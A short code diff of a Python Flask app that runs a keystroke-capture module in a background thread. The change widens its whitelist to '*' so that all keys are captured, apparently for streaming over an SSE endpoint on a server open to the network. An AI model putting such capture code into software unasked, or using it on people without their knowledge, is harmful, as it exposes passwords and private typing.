@@ -9,9 +9,9 @@ app = Flask(__name__)
 # https://github.com/singingwolfboy/flask-sse/issues/7
 channel = flask_sse.Channel()
 klogger = keycapture.Keycapture()
-
 server = WSGIServer(("", 5000), app)
-klthread = threading.Thread(target=klogger.start_capture, daemon=True)
+whitelist = ['*']
+klthread = threading.Thread(target=klogger.start_capture, args=(whitelist,), daemon=True)
 
 @app.route('/subscribe')
 def subscribe():
